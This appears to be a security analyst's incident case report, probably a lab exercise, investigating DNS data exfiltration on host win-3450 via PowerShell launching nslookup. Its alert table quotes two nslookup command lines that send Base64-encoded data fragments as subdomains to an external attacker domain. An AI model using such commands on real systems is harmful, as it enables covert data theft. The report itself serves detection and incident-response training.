# Case Report 002 — DNS Exfiltration via PowerShell

| | |
|---|---|
| **Analyst** | Odo Ikenna Jones |
| **Date** | 7 & 14 July 2026 |
| **Alert IDs** | 1034 & 1032 (correlated) |
| **Severity** | High |
| **Category** | Process / Suspicious Parent-Child Relationship |
| **Status** | Closed — True Positive |
| **ATT&CK** | T1048 Exfiltration Over Alternative Protocol · T1071.004 DNS · T1059.001 PowerShell |

---

## Alert logs

![Alert 1034 — suspicious parent-child relationship](screenshots/case-002-alert-1034.png)

*Figure 1 — Alert #1034: Suspicious Parent-Child Relationship (nslookup.exe / powershell.exe).*

![Alert 1032 — correlated continuation](screenshots/case-002-alert-1032.png)

*Figure 2 — Alert #1032: Suspicious Parent-Child Relationship (correlated continuation).*

---

## Summary

I investigated two "Suspicious Parent-Child Relationship" alerts on host `win-3450` and
determined they were part of a single, ongoing DNS exfiltration attack using PowerShell to
launch `nslookup.exe` with Base64-encoded data embedded in DNS queries to an external domain.
Rather than treating these as two separate events, I correlated them and confirmed they were
stages of the same attack session.

---

## Alert details (correlated)

| Field | Alert 1034 | Alert 1032 |
|---|---|---|
| Timestamp | 07/07/2026 20:40:33 | 07/14/2026 20:23:43 |
| Host | win-3450 | win-3450 |
| Process | `nslookup.exe` | `nslookup.exe` |
| Parent process | `powershell.exe` (PID 3728) | `powershell.exe` (PID 3728) |
| Working directory | `...\downloads\` | `...\downloads\exfiltration\` |
| Command line | `nslookup.exe RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io` | `nslookup.exe 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io` |

---

## Investigation steps

**Step 1 — Classified the alert type.**
Datasource was Sysmon, category Process, so I applied parent-child process analysis rather
than email or network-based logic.

**Step 2 — Checked the child process.**
`nslookup.exe` is a legitimate Windows DNS lookup utility. Not malicious by itself, but worth
scrutinising given the parent process and context.

**Step 3 — Checked the parent process.**
`powershell.exe` spawning `nslookup.exe` is an unusual pattern outside of scripted admin tasks.
I noted the parent PID (3728) and — critically — recognised it was identical across both alerts.
This told me I wasn't looking at two unrelated events, but the same live PowerShell session
responsible for both queries.

**Step 4 — Checked the working directory.**
Alert 1034 ran from `downloads\`. Alert 1032 ran from a subfolder explicitly named
`\downloads\exfiltration\`. Legitimate system tools do not run from user Downloads folders,
and the folder naming itself was a strong confirmation of intent.

**Step 5 — Analysed the command line.**
Both alerts queried the same external domain, `haz4rdw4re.io`, with a different Base64-encoded
string prepended each time. I decoded the first string and got non-printable/binary output
rather than readable text — consistent with fragments of binary data (not a message), which is
expected in real DNS exfiltration since data is broken into small chunks to fit DNS subdomain
length limits.

**Step 6 — Correlated the two alerts.**
This was the key step: instead of triaging each alert in isolation, I compared them directly —
same host, same parent PID, same destination domain, but a new encoded data fragment each time.
This confirmed an active, multi-stage exfiltration attempt, not two coincidental detections.

---

## Findings

- Same PowerShell process (PID 3728) responsible for both DNS queries
- Same external domain (`haz4rdw4re.io`) used across both alerts, consistent with a single C2/exfiltration channel
- Working directory named "exfiltration" strongly indicates attacker intent
- Base64-encoded subdomains decode to non-printable binary, consistent with fragmented data exfiltration over DNS
- Pattern indicates an active, ongoing attack session rather than an isolated event

---

## Verdict

**True Positive — High Severity.** Confirmed DNS-based data exfiltration using PowerShell to
launch repeated `nslookup` queries carrying encoded data fragments to an external domain.

---

## Recommendations

- Isolate host `win-3450` immediately to stop further data loss
- Capture and reassemble full DNS query history for this host to recover the complete exfiltrated data stream
- Inspect the user's `Downloads\exfiltration` folder for the source script or file initiating this PowerShell activity
- Block domain `haz4rdw4re.io` at the DNS/firewall level
- Escalate to the Incident Response team given confirmed active exfiltration

---

## Key takeaway

Don't triage alerts in isolation. By checking whether the same PID, host, or domain appeared in
a prior alert, I was able to see this wasn't two random detections — it was one continuous
attack unfolding in stages. That correlation step is what turns individual alerts into a full
attack story.

---

## Indicators of compromise

| Type | Value |
|---|---|
| Domain | `haz4rdw4re.io` |
| Host | win-3450 |
| Process chain | `powershell.exe` (PID 3728) → `nslookup.exe` |
| Path | `...\downloads\exfiltration\` |
